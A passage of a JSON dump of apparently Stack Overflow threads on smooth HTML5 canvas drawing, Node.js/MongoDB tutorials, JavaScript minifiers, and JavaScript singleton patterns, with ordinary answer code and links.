                    "body": "<p>Have a look at this code:</p>\n\n<p><a href=\"http://jsfiddle.net/aMmVQ/\">http://jsfiddle.net/aMmVQ/</a></p>\n\n<p>What I'm doing is starting a new list of points on mouseDown, then for each mousemove I add a point to the list. Once I get enough points (6 or so) I start drawing quadratic curves, with the control point of the curve being the average of the current point and the next point.</p>\n\n<p><code>drawPoints</code> is the bit that works this magic:</p>\n\n<pre><code>function drawPoints(ctx, points) {\n    // draw a basic circle instead\n    if (points.length &lt; 6) {\n        var b = points[0];\n        ctx.beginPath(), ctx.arc(b.x, b.y, ctx.lineWidth / 2, 0, Math.PI * 2, !0), ctx.closePath(), ctx.fill();\n        return\n    }\n    ctx.beginPath(), ctx.moveTo(points[0].x, points[0].y);\n    // draw a bunch of quadratics, using the average of two points as the control point\n    for (i = 1; i &lt; points.length - 2; i++) {\n        var c = (points[i].x + points[i + 1].x) / 2,\n            d = (points[i].y + points[i + 1].y) / 2;\n        ctx.quadraticCurveTo(points[i].x, points[i].y, c, d)\n    }\n    ctx.quadraticCurveTo(points[i].x, points[i].y, points[i + 1].x, points[i + 1].y), ctx.stroke()\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>Seems that you need to use some <em>brushes</em> in your canvas. It's hard to say what kind of brush exactly you need but there is many JS libraries that has already implement brush technology.</p>\n\n<p>For example did you look at this libraries?</p>\n\n<ul>\n<li><a href=\"http://processingjs.org/\" rel=\"nofollow\">Processing.js</a></li>\n<li><a href=\"https://github.com/triceam/HTML5-Canvas-Brush-Sketch\" rel=\"nofollow\">HTML5-Canvas-Brush-Sketch</a> (<a href=\"http://tricedesigns.com/portfolio/sketch/brush.html\" rel=\"nofollow\">demo</a> and <a href=\"http://www.tricedesigns.com/2012/01/04/sketching-with-html5-canvas-and-brush-images\" rel=\"nofollow\">article</a> how it works)</li>\n</ul>\n\n<p>Laso in web you can find many brushes implemented in Mr. Doob <a href=\"http://mrdoob.com/projects/harmony/\" rel=\"nofollow\">Harmony</a> project. For example <a href=\"http://rhyolight.posterous.com/new-brushes-for-harmony-canvas-app\" rel=\"nofollow\">stringy</a> or <a href=\"https://github.com/rhyolight/Harmony-Brushes\" rel=\"nofollow\">Harmony-Brushes</a> project on github.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I made something like this a while ago and turned it into a jquery plugin.\nhave a look over here, if it's what you're after I'll post a more detailed answer and dig out the simplified jquery version from my archives:</p>\n\n<p><a href=\"http://jsfiddle.net/95tft/\">http://jsfiddle.net/95tft/</a></p>\n\n<p><strong>EDIT</strong></p>\n\n<p>OK, sorry I couldn't do this yesterday:</p>\n\n<p>Originally the code above was forked from Mr Doob's 'harmony' sketcher over here:\n<a href=\"http://mrdoob.com/projects/harmony/#ribbon\">http://mrdoob.com/projects/harmony/#ribbon</a></p>\n\n<p>(which I think is the best solution).\nBut I kinda broke it down and remade it for my own purposes on another project. I've hacked my own plugin a bit to make it a bit easier still over here:</p>\n\n<p><a href=\"http://jsfiddle.net/dh3bj/\">http://jsfiddle.net/dh3bj/</a></p>\n\n<p>The only thing you might want to change is to change it to work on mousedown/mouseup which should be easy also have a look at the settings at the bottom of the plugin, you should be able to get the effect you want by playing with the brush size, colour, alpha (rgba) etc.</p>\n\n<p>Hope that helps</p>\n",
                    "is_accepted": true,
                    "score": 15
                },
                {
                    "body": "<p>Suggest the rendering be done with a chain of bezier curves which surround the curve which is thus filled. (ie end with ctx.fill) \nStill lots of work to do but hope this helps. </p>\n\n<p>Adapted a nice demo app for bezier curves </p>\n\n<p>added it to a fork of your fiddle \n<a href=\"http://jsfiddle.net/d3zFU/1/\" rel=\"nofollow\">http://jsfiddle.net/d3zFU/1/</a></p>\n\n<p>Code is </p>\n\n<pre><code>/*\n * Canvas curves example\n *\n * By Craig Buckler,        http://twitter.com/craigbuckler\n * of OptimalWorks.net        http://optimalworks.net/\n * for SitePoint.com        http://sitepoint.com/\n *\n * Refer to:\n * http://blogs.sitepoint.com/html5-canvas-draw-quadratic-curves/\n * http://blogs.sitepoint.com/html5-canvas-draw-bezier-curves/\n *\n * This code can be used without restriction.\n */\n</code></pre>\n\n<p>(function() {</p>\n\n<pre><code>var canvas, ctx, code, point, style, drag = null, dPoint;\n\n// define initial points\nfunction Init(quadratic) {\n\n    point = {\n        p1: { x:100, y:250 },\n        p2: { x:400, y:250 }\n    };\n\n    if (quadratic) {\n        point.cp1 = { x: 250, y: 100 };\n    }\n    else {\n        point.cp1 = { x: 150, y: 100 };\n        point.cp2 = { x: 350, y: 100 };\n    }\n\n    // default styles\n    style = {\n        curve:    { width: 6, color: \"#333\" },\n        cpline:    { width: 1, color: \"#C00\" },\n        point: { radius: 10, width: 2, color: \"#900\", fill: \"rgba(200,200,200,0.5)\", arc1: 0, arc2: 2 * Math.PI }\n    }\n\n    // line style defaults\n    ctx.lineCap = \"round\";\n    ctx.lineJoin = \"round\";\n\n    // event handlers\n    canvas.onmousedown = DragStart;\n    canvas.onmousemove = Dragging;\n    canvas.onmouseup = canvas.onmouseout = DragEnd;\n\n    DrawCanvas();\n}\n\n\n// draw canvas\nfunction DrawCanvas() {\n    ctx.clearRect(0, 0, canvas.width, canvas.height);\n\n    // control lines\n    ctx.lineWidth = style.cpline.width;\n    ctx.strokeStyle = style.cpline.color;\n    ctx.fillStyle = style.cpline.color;\n    ctx.beginPath();\n    ctx.moveTo(point.p1.x, point.p1.y);\n    ctx.lineTo(point.cp1.x, point.cp1.y);\n    if (point.cp2) {\n        ctx.moveTo(point.p2.x, point.p2.y);\n        ctx.lineTo(point.cp2.x, point.cp2.y);\n    }\n    else {\n        ctx.lineTo(point.p2.x, point.p2.y);\n    }\n    ctx.stroke();\n\n    // curve\nctx.lineWidth = 1 ; //style.curve.width;\n    ctx.strokeStyle = style.curve.color;\n    ctx.beginPath();\n    ctx.moveTo(point.p1.x, point.p1.y);\n    if (point.cp2) {\n        ctx.bezierCurveTo(point.cp1.x, point.cp1.y, point.cp2.x, point.cp2.y, point.p2.x, point.p2.y);\n        ctx.bezierCurveTo(point.cp2.x, point.cp2.y+12, point.cp1.x, point.cp1.y+12, point.p1.x, point.p1.y);\n\n    }\n    else {\n        ctx.quadraticCurveTo(point.cp1.x, point.cp1.y, point.p2.x, point.p2.y);\n    }\n//ctx.stroke();\nctx.fill();\n\n    // control points\n    for (var p in point) {\n        ctx.lineWidth = style.point.width;\n        ctx.strokeStyle = style.point.color;\n        ctx.fillStyle = style.point.fill;\n        ctx.beginPath();\n        ctx.arc(point[p].x, point[p].y, style.point.radius, style.point.arc1, style.point.arc2, true);\n        ctx.fill();\n        ctx.stroke();\n    }\n\n    ShowCode();\n}\n\n\n// show canvas code\nfunction ShowCode() {\n    if (code) {\n        code.firstChild.nodeValue =\n            \"canvas = document.getElementById(\\\"canvas\\\");\\n\"+\n            \"ctx = canvas.getContext(\\\"2d\\\")\\n\"+\n            \"ctx.lineWidth = \" + style.curve.width +\n            \";\\nctx.strokeStyle = \\\"\" + style.curve.color +\n            \"\\\";\\nctx.beginPath();\\n\" +\n            \"ctx.moveTo(\" + point.p1.x + \", \" + point.p1.y +\");\\n\" +\n            (point.cp2 ?\n                \"ctx.bezierCurveTo(\"+point.cp1.x+\", \"+point.cp1.y+\", \"+point.cp2.x+\", \"+point.cp2.y+\", \"+point.p2.x+\", \"+point.p2.y+\");\" :\n                \"ctx.quadraticCurveTo(\"+point.cp1.x+\", \"+point.cp1.y+\", \"+point.p2.x+\", \"+point.p2.y+\");\"\n            ) +\n            \"\\nctx.stroke();\"\n        ;\n    }\n}\n\n\n// start dragging\nfunction DragStart(e) {\n    e = MousePos(e);\n    var dx, dy;\n    for (var p in point) {\n        dx = point[p].x - e.x;\n        dy = point[p].y - e.y;\n        if ((dx * dx) + (dy * dy) &lt; style.point.radius * style.point.radius) {\n            drag = p;\n            dPoint = e;\n            canvas.style.cursor = \"move\";\n            return;\n        }\n    }\n}\n\n\n// dragging\nfunction Dragging(e) {\n    if (drag) {\n        e = MousePos(e);\n        point[drag].x += e.x - dPoint.x;\n        point[drag].y += e.y - dPoint.y;\n        dPoint = e;\n        DrawCanvas();\n    }\n}\n\n\n// end dragging\nfunction DragEnd(e) {\n    drag = null;\n    canvas.style.cursor = \"default\";\n    DrawCanvas();\n}\n\n\n// event parser\nfunction MousePos(event) {\n    event = (event ? event : window.event);\n    return {\n        x: event.pageX - canvas.offsetLeft,\n        y: event.pageY - canvas.offsetTop\n    }\n}\n\n\n// start\ncanvas = document.getElementById(\"canvas\");\ncode = document.getElementById(\"code\");\nif (canvas.getContext) {\n    ctx = canvas.getContext(\"2d\");\n    Init(canvas.className == \"quadratic\");\n}\n</code></pre>\n\n<p>})();</p>\n\n<p></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>For those interested in a click version of the code provided by @Alex, I've rewritten his script here:</p>\n\n<p><a href=\"http://jsbin.com/aqoqad/3/\" rel=\"nofollow\">http://jsbin.com/aqoqad/3/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<h2>Why don't you use <a href=\"https://github.com/disjukr/croquis.js\" rel=\"nofollow\">croquis.js</a>?</h2>\n\n<p>It has neat <a href=\"http://crosspop.github.io/Croquispop/brush-preview.html\" rel=\"nofollow\">brush implementation like photoshop</a> :)</p>\n\n<p>And here is <a href=\"http://labs.crosspop.in/Croquispop/croquispop.html\" rel=\"nofollow\">Demo</a> which is using croquis.js.</p>\n\n<p><img src=\"http://i.stack.imgur.com/AU08n.png\" alt=\"brush-preview\"></p>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I am trying to create a drawing area with canvas. I am having trouble with making the lines look smooth when drawing curves and I also have changing line thickness in my algorithm which looks bad as well because the size jumps to much as well and you can see where the size changed. I did find this <a href=\"http://stackoverflow.com/questions/5076622/iphone-smooth-sketch-drawing-algorithm\">link on stackoverflow</a> but this was for a native iPhone app and I can't figure it out. </p>\n\n<p>Here is my current JS code. and Here is it running <a href=\"http://jsfiddle.net/PbPBS/\">on jsFiddle</a></p>\n\n<pre><code>var xStart,\nxEnd,\nyStart,\nyEnd,\npaint,\nctx;\n$(document).ready(function (){\n\n   ctx = $('canvas')[0].getContext(\"2d\");\n   ctx.strokeStyle = '#000';\n   ctx.lineJoin=\"round\";\n   ctx.lineCap=\"round\";\n   ctx.lineWidth = 1;\n\n\n   $('canvas').bind('mousedown mousemove mouseup mouseleave touchstart touchmove touchend', function(e){\n        var orig = e.originalEvent;\n\n        if(e.type == 'mousedown'){\n            e.preventDefault(); e.stopPropagation();\n\n            xStart = e.clientX - $(this).offset().left;\n            yStart = e.clientY - $(this).offset().top;\n            xEnd = xStart;\n            yEnd = yStart;\n\n            paint = true;\n            draw(e.type);\n\n        }else if(e.type == 'mousemove'){\n            if(paint==true){\n                xEnd = e.clientX - $(this).offset().left;\n                yEnd = e.clientY - $(this).offset().top;\n\n\n               lineThickness = 1 + Math.sqrt((xStart - xEnd) *(xStart-xEnd) + (yStart - yEnd) * (yStart-yEnd))/5;\n\n               if(lineThickness &gt; 10){\n                    lineThickness = 10;   \n               }\n\n                ctx.lineWidth = lineThickness;\n                draw(e.type);\n            }\n        }else if(e.type == 'mouseup'){\n            paint = false;\n        }else if(e.type == 'mouseleave'){\n            paint = false;\n        }else if(e.type == 'touchstart'){\n            if(orig.touches.length == 1){\n                e.preventDefault(); e.stopPropagation();\n\n                xStart = orig.changedTouches[0].pageX - $(this).offset().left;\n                yStart = orig.changedTouches[0].pageY - $(this).offset().top;\n                xEnd = xStart;\n                yEnd = yStart; \n\n                paint = true;\n                draw(e.type);\n            }\n        }else if(e.type == 'touchmove'){\n            if(orig.touches.length == 1){\n                if(paint==true){\n                    xEnd = orig.changedTouches[0].pageX - $(this).offset().left;\n                    yEnd = orig.changedTouches[0].pageY - $(this).offset().top;\n\n\n                            lineThickness = 1 + Math.sqrt((xStart - xEnd) *(xStart-xEnd) + (yStart - yEnd) * (yStart-yEnd))/6;\n                       if(lineThickness &gt; 10){\n                          lineThickness = 10;   \n                       }\n\n\n                      ctx.lineWidth = lineThickness;\n\n\n                    draw(e.type);\n                }\n            }\n        }else if(e.type == 'touchend'){\n            paint = false;\n        }\n\n      });\n    });\n\n\n    function draw(event){\n\n    if(event == 'mousedown'){\n        ctx.beginPath();\n        ctx.moveTo(xStart, yStart);\n        ctx.lineTo(xEnd, yEnd);\n        ctx.stroke();\n    }else if(event == 'mousemove'){\n        ctx.beginPath();\n        ctx.moveTo(xStart, yStart);\n        ctx.lineTo(xEnd, yEnd);\n        ctx.stroke();\n    }else if(event == 'touchstart'){\n        ctx.beginPath();\n        ctx.moveTo(xStart, yStart);\n        ctx.lineTo(xEnd, yEnd);\n        ctx.stroke();\n    }else if(event == 'touchmove'){\n        ctx.beginPath();\n        ctx.moveTo(xStart, yStart);\n        ctx.lineTo(xEnd, yEnd);\n        ctx.stroke();\n    }\n    xStart = xEnd;\n    yStart = yEnd;                  \n}\n</code></pre>\n\n<p>Thank you all in advance. </p>\n\n<p>This is what it looks like right now if you draw. <img src=\"http://i.stack.imgur.com/UnSkj.png\" alt=\"current (jagged) implementation\"> </p>\n\n<p>... and this is what I would love to achieve: </p>\n\n<p><img src=\"http://i.stack.imgur.com/UL1UP.png\" alt=\"smooth brushstrokes\"></p>\n",
            "last_activity_date": 1389770257,
            "question_id": 10567287,
            "score": 24,
            "tags": [
                "javascript",
                "html5",
                "canvas",
                "drawing",
                "paint"
            ],
            "title": "Implementing smooth sketching and drawing on the &lt;canvas&gt; element"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>These should help you get started:</p>\n\n<ul>\n<li><p><a href=\"http://howtonode.org/express-mongodb\">http://howtonode.org/express-mongodb</a><br>\nBased on old version of node, but useful walkthrough of using mongodb-native package.</p></li>\n<li><p><a href=\"http://mongoosejs.com\">http://mongoosejs.com</a>   A node package you can install using npm (http://npmjs.org)<br>\nUseful package for interacting with mongoDB from Node.</p></li>\n<li><p><a href=\"http://dailyjs.com/tags.html#lmawa\">http://dailyjs.com/tags.html#lmawa</a> The folks at dailyjs.com walk you through building a web-app with node.js and mongoDB (using mongoose). This link is the full series of posts that make up the tutorial. </p></li>\n</ul>\n\n<p>Hope this helps. </p>\n\n<p><strong>[UPDATE] 2/14/2012</strong><br>\n- <a href=\"http://howtonode.org/node-js-and-mongodb-getting-started-with-mongojs\">http://howtonode.org/node-js-and-mongodb-getting-started-with-mongojs</a>\nVia howtonode.org - it's supser short but gives you the basics and is current (as this question is months old now).</p>\n\n<p><strong>[UPDATE] 7/25/2012</strong>\n- <a href=\"http://blog.james-carr.org/2012/01/16/blog-rolling-with-mongodb-node-js-and-coffeescript/\">http://blog.james-carr.org/2012/01/16/blog-rolling-with-mongodb-node-js-and-coffeescript/</a>\nAlso uses coffee-script and express and goes into testing with mocha and should.js.  </p>\n",
                    "is_accepted": true,
                    "score": 34
                },
                {
                    "body": "<p>Just for the people who will see this later, at first since in the time I posted this question, I wasn't used to node.js coding style, but what helped me was this tutorial: </p>\n\n<p><a href=\"https://web.archive.org/web/20130926043928/http://christiankvalheim.com/post/3853862905/mongotutorial0\" rel=\"nofollow\">https://web.archive.org/web/20130926043928/http://christiankvalheim.com/post/3853862905/mongotutorial0</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><a href=\"http://alexeypetrushin.github.com/mongo-model\" rel=\"nofollow\">http://alexeypetrushin.github.com/mongo-model</a></p>\n\n<p><a href=\"http://alexeypetrushin.github.com/mongo-model/presentations/introduction/index.html\" rel=\"nofollow\">http://alexeypetrushin.github.com/mongo-model/presentations/introduction/index.html</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This is a link to a very nice series of video to get started on node and mongo.\n<a href=\"http://www.youtube.com/watch?v=0_GNHWZHc-o\" rel=\"nofollow\">http://www.youtube.com/watch?v=0_GNHWZHc-o</a></p>\n\n<p>Hope it helps.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Several of the links in the other answers are now outdated. In particular, the docs now recommend using a new top-level class called <a href=\"http://blog.mongodb.org/post/36666163412/introducing-mongoclient\" rel=\"nofollow\">MongoClient</a>.</p>\n\n<p>10gen includes a tutorial in its documentation that helped me: <a href=\"http://mongodb.github.com/node-mongodb-native/index.html\" rel=\"nofollow\">http://mongodb.github.com/node-mongodb-native/index.html</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>try Mike Wilson's <a href=\"http://shop.oreilly.com/product/0636920026587.do\" rel=\"nofollow\">Building Node Applications with MongoDB and Backbone book</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I just got started with nodeJS, and don't know much about it. Also I found mongoDB, and I want to use it in my project.\nI searched for a tutorial, but there are all examples, that I don't completely understand.\nDo yo know any tutorial that could help me?\nthanks</p>\n",
            "last_activity_date": 1401342652,
            "question_id": 6166322,
            "score": 24,
            "tags": [
                "javascript",
                "node.js",
                "mongodb"
            ],
            "title": "Do you know any tutorial for mongoDB in nodeJS?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>I believe that YUICompressor does #1, except for the function names, and #2 using a special syntax that is removed during compression.</p>\n\n<p>#3 is just a build task, not a function of the compressor.</p>\n\n<p><a href=\"http://www.julienlecomte.net/yuicompressor/\" rel=\"nofollow\">YUICompressor</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Here are the minifiers I know of:\nDean Edwards' <a href=\"http://dean.edwards.name/packer/\" rel=\"nofollow\">packer</a>; YUI <a href=\"http://developer.yahoo.com/yui/compressor/\" rel=\"nofollow\">Compressor</a>; <a href=\"http://crockford.com/javascript/jsmin\" rel=\"nofollow\">JSMIN</a>; and Dojo <a href=\"http://dojotoolkit.org/docs/shrinksafe\" rel=\"nofollow\">compressor</a></p>\n\n<p>In addition to these, the <a href=\"http://code.google.com/webtoolkit/overview.html\" rel=\"nofollow\">GWT compiler</a> does quite a bit to make efficient JavaScript files out of Java files.  It wouldn't surprise me if that is what they use.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>A simple online javascript minifier based on dojo's shrink safe can be found at \n<a href=\"http://netspurt.com\" rel=\"nofollow\">http://netspurt.com</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>There's also <a href=\"http://yuicompressor.codeplex.com/\" rel=\"nofollow\">a .NET port of YUI Compressor</a> which allows you to:-</p>\n\n<ul>\n<li>intergrate the minification/file combining into Visual Studio post-build events </li>\n<li>intergrate into a TFS Build (including CI) </li>\n<li>if you wish to just use the dll's in your own code (eg. on the fly minification).</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>What you are describing is an \"obfuscator\" not a minifier, and they are easily found by searching for \"Javascript obfuscator\".</p>\n\n<p>Our <a href=\"http://www.semanticdesigns.com/Products/Obfuscators/ECMAScriptObfuscator.html\" rel=\"nofollow\">SD Thicket ECMAScript Obfuscator</a> both obfuscates and minifies at the same time.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Google has now opened up the <a href=\"http://closure-compiler.appspot.com/home\">minifier</a> they use along with some other internal javascript goodies.</p>\n\n<p>It's all under the name <a href=\"http://code.google.com/closure/\">\"Closure Tools\"</a> and was <a href=\"http://googlecode.blogspot.com/2009/11/introducing-closure-tools.html\">announced</a> earlier this month.</p>\n",
                    "is_accepted": true,
                    "score": 48
                }
            ],
            "body": "<p>I am a Google Maps API (javascript) developer. I have noticed that Google uses a Javascript minifier that has the following features:</p>\n\n<ol>\n<li>Shortens variables, properties, arguments, classes, function and method names, obfuscating the code. (eg. function1 -> a, function2 -> b, function3 -> c)</li>\n<li>Some variables, classes, properties and methods can be marked to not be crunched, so its name remains the same as documented in the API manual.</li>\n<li>It is rerun in each subversion of the API, like a build task, I noticed that because of the crunched names changes from one version to another.</li>\n</ol>\n\n<p>I have not found in the whole internet a Javascript minifier with those features. Anyone knows one?</p>\n",
            "last_activity_date": 1303940372,
            "question_id": 489847,
            "score": 20,
            "tags": [
                "javascript",
                "obfuscation",
                "minify"
            ],
            "title": "Which Javascript minifier (cruncher) does the same things that the one Google uses for its JS APIs?"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>The latter code box shows what I've seen JS devs call their version of OO design in Javascript. </p>\n\n<p>Singetons are meant to be singular objects that can't be constructed (except, I suppose, in the initial definition. You have one, global instance of a singleton. </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I've wondered about this too, but just defining an object with functions in it seems reasonable to me.  No sense creating a constructor that nobody's ever supposed to call, to create an object with no prototype, when you can just define the object directly.</p>\n\n<p>On the other hand, if you want your singleton to be an instance of some existing \"class\" -- that is, you want it to have some other object as its prototype -- then you <em>do</em> need to use a constructor function, so that you can set its <code>prototype</code> property before calling it.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I agree with you, the simplest way is to use a object literal, but if you want <em>private</em> members, you could implement taking advantage of <a href=\"http://www.jibbering.com/faq/faq%5Fnotes/closures.html\">closures</a>:</p>\n\n<pre><code>var myInstance = (function() {\n  var privateVar;\n\n  function privateMethod () {\n    // ...\n  }\n\n  return { // public interface\n    publicMethod1: function () {\n      // private members can be accessed here\n    },\n    publicMethod2: function () {\n      // ...\n    }\n  };\n})();\n</code></pre>\n\n<p>About the <code>new function(){}</code> construct, it will simply use an anonymous function as a <a href=\"https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FGuide/Creating%5FNew%5FObjects/Using%5Fa%5FConstructor%5FFunction\"><code>constructor function</code></a>, the context inside that function will be a new object that will be returned.</p>\n\n<p><strong>Edit:</strong> In response to the <a href=\"http://stackoverflow.com/questions/1895635/javascript-singleton-question#comment-1799557\">@J5's comment</a>, that is simple to do, actually I think that this can be a nice example for using a <em>Lazy Function Definition</em> pattern:</p>\n\n<pre><code>function singleton() {\n  var instance = (function() {\n    var privateVar;\n\n    function privateMethod () {\n      // ...\n    }\n\n    return { // public interface\n      publicMethod1: function () {\n          // private members can be accessed here\n       },\n      publicMethod2: function () {\n        // ...\n      }\n    };\n  })();\n\n  singleton = function () { // re-define the function for subsequent calls\n    return instance;\n  };\n\n  return singleton(); // call the new function\n}\n</code></pre>\n\n<p>When the function is called the first time, I make the object instance, and reassign <code>singleton</code> to a new function which has that object instance in it's closure.</p>\n\n<p>Before the end of the first time call I execute the re-defined <code>singleton</code> function that will return the created instance.</p>\n\n<p>Following calls to the <code>singleton</code> function will simply return the <code>instance</code> that is stored in it's closure, because the new function is the one that will be executed.</p>\n\n<p>You can prove that by comparing the object returned:</p>\n\n<pre><code>singleton() == singleton(); // true\n</code></pre>\n\n<p>The <code>==</code> operator for objects will return <code>true</code> only if the object <em>reference</em> of both operands is the same, it will return false even if the objects are identical but they are two different instances:</p>\n\n<pre><code>({}) == ({}); // false\nnew Object() == new Object(); // false\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 31
                },
                {
                    "body": "<p>The point of using the \"pseudo constructor\" is that it creates a new variable scope. You can declare local variables inside the function that are available inside any nested functions but not from the global scope.</p>\n\n<p>There are actually two ways of doing it. You can call the function with <code>new</code> like in your example, or just call the function directly. There are slight differences in how you would write the code, but they are essentially equivalent.</p>\n\n<p>Your second example could be written like this:</p>\n\n<pre><code>var singleton = new function () {\n    var privateVariable = 42; // This can be accessed by dothis and dothat\n\n    this.dothis = function () {\n        return privateVariable;\n    };\n\n    this.dothat = function () {};\n}; // Parentheses are allowed, but not necessary unless you are passing parameters\n</code></pre>\n\n<p>or</p>\n\n<pre><code>var singleton = (function () {\n    var privateVariable = 42; // This can be accessed by dothis and dothat\n\n    return {\n        dothis: function () {\n            return privateVariable;\n        },\n\n        dothat: function () {}\n    };\n})(); // Parentheses are required here since we are calling the function\n</code></pre>\n\n<p>You could also pass arguments to either function (you would need to add parentheses to the first example).</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I have used the second version (<code>var singleton = {};</code>) for everything from Firefox extensions to websites, and it works really well. One good idea is to not define things inside the curly brackets, but outside it using the name of the object, like so:</p>\n\n<pre><code>var singleton = {};\nsingleton.dothis = function(){\n\n};\nsingleton.someVariable = 5;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>The singleton pattern is implemented by creating a class with a method that creates a new instance of the class if one does not exist. If an instance already exists, it simply returns a reference to that object. <a href=\"http://en.wikipedia.org/wiki/Singleton%5Fpattern\" rel=\"nofollow\">1</a></p>\n\n<pre><code>(function (global) {\n\n     var singleton;\n\n     function Singleton () {\n         // singleton does have a constructor that should only be used once    \n         this.foo = \"bar\";\n         delete Singleton; // disappear the constructor if you want\n     }\n\n     global.singleton = function () {\n         return singleton || (singleton = new Singleton());\n     };\n\n})(window);\n\nvar s = singleton();\nconsole.log(s.foo);\n\nvar y = singleton();\ny.foo = \"foo\";\nconsole.log(s.foo);\n</code></pre>\n\n<p>You don't just declare the singleton as an object because that instantiates it, it doesn't declare it.  It also doesn't provide a mechanism for code that doesn't know about a previous reference to the singleton to retrieve it.  The singleton is not the object/class that is returned by the singleton, it's a structure.  This is similar to how closured variables are not closures, the function scope providing the closure is the closure.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Crockford (seems to) agree that the object literal is all you need for a singleton in JavaScript:</p>\n\n<p><a href=\"http://webcache.googleusercontent.com/search?q=cache:-j5RwC92YU8J:www.crockford.com/codecamp/The%2520Good%2520Parts%2520ppt/5%2520functional.ppt+singleton+site:www.crockford.com&amp;cd=1&amp;hl=en&amp;ct=clnk\" rel=\"nofollow\">http://webcache.googleusercontent.com/search?q=cache:-j5RwC92YU8J:www.crockford.com/codecamp/The%2520Good%2520Parts%2520ppt/5%2520functional.ppt+singleton+site:www.crockford.com&amp;cd=1&amp;hl=en&amp;ct=clnk</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>How about this:</p>\n\n<pre><code>function Singleton() {\n\n    // ---------------\n    // Singleton part.\n    // ---------------\n\n    var _className = null;\n    var _globalScope = null;\n\n    if ( !(this instanceof arguments.callee) ) {\n        throw new Error(\"Constructor called as a function.\");\n    }\n\n    if ( !(_className = arguments.callee.name) ) {\n        throw new Error(\"Unable to determine class name.\")\n    }\n\n    _globalScope = (function(){return this;}).call(null);\n\n    if ( !_globalScope.singletons ) {\n        _globalScope.singletons = [];\n    }\n\n    if ( _globalScope.singletons[_className] ) {\n        return _globalScope.singletons[_className];\n    } else {\n        _globalScope.singletons[_className] = this;\n    }\n\n    // ------------\n    // Normal part.\n    // ------------\n\n    var _x = null;\n\n    this.setx = function(val) {\n        _x = val;\n    }; // setx()\n\n    this.getx = function() {\n        return _x;\n    }; // getx()\n\n    function _init() {\n        _x = 0; // Whatever initialisation here.\n    } // _init()\n    _init();\n\n} // Singleton()\n\n    var p = new Singleton;\n    var q = new Singleton;\n\n    p.setx(15);\n    q.getx(); // returns 15\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I stole this from <a href=\"http://stackoverflow.com/users/5445/cms\">CMS</a> / <a href=\"http://stackoverflow.com/questions/1895635/javascript-singleton-question/1895669#1895669\">CMS' answer</a>, and changed it so it can be invoked as:</p>\n\n<pre><code>MySingleton.getInstance().publicMethod1();\n</code></pre>\n\n<p>With the slight alternation:</p>\n\n<pre><code>var MySingleton = {                // These two lines\n\n    getInstance: function() {      // These two lines\n\n      var instance = (function() {\n\n        var privateVar;\n\n        function privateMethod () {\n          // ...\n          console.log( \"b\" );\n        }\n\n        return { // public interface\n          publicMethod1: function () {\n              // private members can be accessed here\n              console.log( \"a\" );\n           },\n          publicMethod2: function () {\n            // ...\n            privateMethod();\n          }\n        };\n      })();\n\n      singleton = function () { // re-define the function for subsequent calls\n        return instance;\n      };\n\n      return singleton(); // call the new function\n    }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The ES5 spec lets us use Object.create():</p>\n\n<pre><code>var SingletonClass = (function() {\n    var instance;\n    function SingletonClass() {\n        if (instance == null) {\n            instance = Object.create(SingletonClass.prototype);\n        }\n\n        return instance;\n    }\n\n    return {\n        getInstance: function() {\n            return new SingletonClass();\n        }\n   };\n})();\n\nvar x = SingletonClass.getInstance();\nvar y = SingletonClass.getInstance();\nvar z = new x.constructor();\n</code></pre>\n\n<p>This is nice, since we don't have to worry about our constructor leaking, we still always end up with the same instance.</p>\n\n<p>This structure also has the advantage that our Singleton doesn't construct itself until it is required. Additionally, using the closure as we do here prevents external code from using our \"instance\" variable, accidentally or otherwise. We can build more private variables in the same place and we can define anything we care to export publically on our class prototype.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
